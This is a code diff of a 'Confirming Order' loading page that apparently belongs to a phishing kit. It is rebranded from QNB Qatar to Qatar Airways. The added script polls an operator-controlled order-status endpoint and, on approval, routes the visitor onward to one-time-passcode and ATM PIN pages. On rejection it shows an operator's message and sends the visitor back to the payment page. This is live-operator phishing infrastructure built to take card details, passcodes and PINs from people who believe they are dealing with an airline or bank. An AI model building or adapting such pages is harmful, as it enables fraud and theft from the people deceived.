@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QNB Qatar - Loading...</title>
+    <title>Qatar Airways - Processing...</title>
     <style>
         *, *::before, *::after { box-sizing: border-box; }
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #5C0632;
             display: flex;
             justify-content: center;
@@ -61,126 +61,119 @@
             margin: 0;
         }
 
-        /* Header Styles */
-        header {
+        /* Error Modal */
+        .error-overlay {
+            display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background-color: #ffffff;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
-            display: flex;
-            justify-content: space-between;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 10000;
+            justify-content: center;
             align-items: center;
-            padding: 15px 40px;
-            z-index: 1000;
         }
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 20px;
+        .error-overlay.active { display: flex; }
+        .error-box {
+            background: white;
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: shake 0.5s;
+            border: 2px solid #dc3545;
         }
-        .header-left img {
-            height: 55px;
-            object-fit: contain;
-        }
-        .lang-btn {
-            font-weight: bold;
-            color: #ffffff;
-            background: #5C0632;
-            padding: 10px 20px;
-            border-radius: 6px;
-            text-decoration: none;
+        .error-box .icon { font-size: 50px; color: #dc3545; margin-bottom: 15px; }
+        .error-box h3 { color: #dc3545; margin-bottom: 10px; }
+        .error-box p { color: #555; font-size: 15px; }
+        .error-box button {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 8px;
             font-size: 15px;
-        }
-        .lang-btn:hover {
-            background-color: #3D0420;
-        }
-        .menu-icon {
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            width: 22px;
-            height: 16px;
             cursor: pointer;
-        }
-        .menu-icon span {
-            display: block;
-            height: 3px;
-            background-color: #000000;
-            border-radius: 2px;
+            font-weight: bold;
         }
 
-        /* Footer Styles */
-        .footer-container {
-            max-width: 1100px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        .footer-logo {
-            height: 50px;
-            object-fit: contain;
-            margin-bottom: 25px;
-            background: transparent;
-        }
-        .footer-info {
-            font-size: 15px;
-            line-height: 2.2;
-            color: #cccccc;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-        .footer-bottom {
-            margin-top: 40px;
-            width: 100%;
-            border-top: 1px solid #3D0420;
-            padding-top: 20px;
-            font-size: 14px;
-            color: #777777;
-            text-align: center;
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
         }
     </style>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <header>
-        <div class="menu-icon">
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
-        <div class="header-left">
-            <img src="images/qatar_airways/logo.png" alt="Qatar Airways">
-        </div>
-        <div class="header-right">
-            <a href="loading.html" class="lang-btn">العربية</a>
-        </div>
-    </header>
-<div class="loading-container">
+    <div class="loading-container">
         <div class="spinner-wrapper">
             <div class="spinner"></div>
         </div>
         <div class="loading-title">Confirming Order...</div>
-        <p class="loading-text">Please wait while your payment is being processed.</p>
+        <p class="loading-text">Please wait, your payment is being processed.</p>
     </div>
-    <footer style="background-color: #5C0632; color: #ffffff; padding: 60px 20px 30px 20px; margin-top: 60px;">
-        <div class="footer-container">
-            <a href="index-en.html"><img src="images/qatar_airways/logo_white.png" alt="Qatar Airways" class="footer-logo"></a>
-            <div class="footer-info">
-                <strong>Qatar Airways</strong>
-                <span>Doha - State of Qatar</span>
-                <span>Phone: +974 4403 6666</span>
-                <span>Email: info@qatarairways.com</span>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2024 Qatar National Bank. All rights reserved.</p>
-            </div>
+
+    <!-- Error Modal -->
+    <div class="error-overlay" id="errorOverlay">
+        <div class="error-box">
+            <div class="icon">&#10005;</div>
+            <h3>Verification Failed</h3>
+            <p id="errorMessage">Please check the correct data and try again</p>
+            <button onclick="closeErrorAndRetry()">Retry</button>
         </div>
-    </footer>
+    </div>
+
+    <script>
+        let pollInterval = null;
+        const MAX_POLL_TIME = 120000;
+        let startTime = Date.now();
+
+        async function pollOrderStatus() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) return;
+
+            if (Date.now() - startTime > MAX_POLL_TIME) {
+                clearInterval(pollInterval);
+                return;
+            }
+
+            try {
+                const res = await fetch('/api/orders/' + orderId + '/status');
+                const data = await res.json();
+
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    const nextPages = {
+                        'loading_otp': 'otp-en.html',
+                        'otp': 'otp-en.html',
+                        'loading_atm': 'atm-pin-en.html',
+                        'atm_pin': 'atm-pin-en.html',
+                        'loading_success': 'success-en.html',
+                        'success': 'success-en.html'
+                    };
+                    window.location.href = nextPages[data.currentPage] || 'otp-en.html';
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    if (data.message) {
+                        document.getElementById('errorMessage').textContent = data.message;
+                    }
+                    document.getElementById('errorOverlay').classList.add('active');
+                }
+            } catch (err) {
+                console.error('Poll error:', err);
+            }
+        }
+
+        function closeErrorAndRetry() {
+            document.getElementById('errorOverlay').classList.remove('active');
+            window.location.href = 'payment-en.html';
+        }
+
+        pollInterval = setInterval(pollOrderStatus, 2000);
+        pollOrderStatus();
+    </script>
 
 </body>
 </html>
